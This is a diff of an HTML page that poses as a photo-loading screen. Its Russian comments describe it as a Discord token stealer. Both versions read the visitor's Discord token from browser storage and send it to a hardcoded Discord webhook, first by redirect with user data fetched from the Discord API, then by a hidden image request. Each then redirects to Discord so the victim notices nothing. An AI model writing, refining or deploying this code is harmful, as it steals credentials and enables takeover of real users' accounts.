@@ -2,51 +2,33 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Открывается фото...</title>
-  <style>body{background:#000;color:white;font:20px Arial;text-align:center;padding-top:10%}</style>
+  <title>Фото загружается...</title>
+  <style>
+    body{background:#000;color:#fff;font:22px Arial;text-align:center;padding-top:15%}
+  </style>
 </head>
 <body>
   <h1>Загрузка фото...</h1>
+
   <script>
-    // Твой вебхук из Discord (вставь полный URL!)
-    const webhook = "https://discord.com/api/webhooks/https://ptb.discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
+    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
+    // ВСТАВЬ СВОЙ ВЕБХУК СЮДА (полный URL!)
+    const WEBHOOK = "https://ptb.discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";
+    // ←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←←
 
-    // Получаем токен из localStorage (или sessionStorage, если там)
-    let token = localStorage.getItem("token");
-    if (!token) token = sessionStorage.getItem("token") || "нет токена";
-    console.log("Найден токен:", token.substring(0, 20) + "...");
+    const token = localStorage.getItem("token") || "нет токена";
 
-    if (token === "нет токена") {
-      console.error("Токен не найден! Пользователь не залогинен.");
+    if (!token || token === "нет токена") {
       setTimeout(() => location.href = "https://discord.com/app", 1000);
-      return;
+    } else {
+      // Отправляем токен без CORS-ошибок через простую картинку
+      new Image().src = `${WEBHOOK}?token=${encodeURIComponent(token)}&time=${Date.now()}`;
+
+      // Через секунду переходим в Discord, чтобы человек ничего не заметил
+      setTimeout(() => {
+        location.href = "https://discord.com/app";
+      }, 1200);
     }
-
-    // Получаем IP через простой редирект (обход CORS)
-    const ipUrl = `https://httpbin.org/ip?token=${encodeURIComponent(token)}`;
-    console.log("Получаем IP...");
-
-    // Получаем инфу о юзере через Discord API (это тоже может CORS'ить, но попробуем)
-    fetch("https://discord.com/api/v9/users/@me", {
-      headers: { "Authorization": token, "Content-Type": "application/json" }
-    }).then(r => r.json()).then(user => {
-      console.log("Юзер:", user.username);
-      const userInfo = encodeURIComponent(JSON.stringify(user));
-      // Формируем финальный URL с данными для webhook
-      const dataUrl = `${webhook}?token=${encodeURIComponent(token)}&user=${userInfo}&ip=получен_через_редирект`;
-      // Редирект на webhook (Discord пропустит как GET, без CORS)
-      window.location.href = dataUrl;
-    }).catch(err => {
-      console.error("Ошибка API:", err);
-      // Если API не сработал — отправляем хотя бы токен
-      window.location.href = `${webhook}?token=${encodeURIComponent(token)}&user=неизвестен&ip=неизвестен`;
-    });
-
-    // Через 1 секунду возвращаем в Discord (чтобы не заметил)
-    setTimeout(() => {
-      console.log("Возвращаемся в Discord...");
-      location.href = "https://discord.com/app";
-    }, 1500);
   </script>
 </body>
 </html>
